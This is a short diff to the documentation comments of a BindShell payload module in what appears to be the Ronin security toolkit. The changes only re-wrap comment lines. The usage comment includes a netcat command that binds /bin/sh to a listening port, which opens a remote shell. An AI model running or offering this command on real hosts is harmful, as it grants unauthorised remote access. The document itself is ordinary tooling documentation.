@@ -41,8 +41,8 @@ module Ronin
       #
       # ## Usage
       # 
-      # On the remote host start the bind-shell. The easiest way is using the
-      # `netcat` utility; assuming you can execute commands.
+      # On the remote host start the bind-shell. The easiest way is using
+      # the `netcat` utility; assuming you can execute commands.
       #
       #     $ nc -l 9999 -e /bin/sh
       #
@@ -54,7 +54,8 @@ module Ronin
       # Then access the bind-shell.
       #
       #     payload.shell.ls
-      #     # => "Documents  Music\t   Public  Templates\nDesktop       Downloads  Pictures  src\t   Videos\n"
+      #     # => "Documents  Music\t   Public  Templates\nDesktop
+      #     Downloads  Pictures  src\t   Videos\n"
       #
       module BindShell
         def self.extended(base)
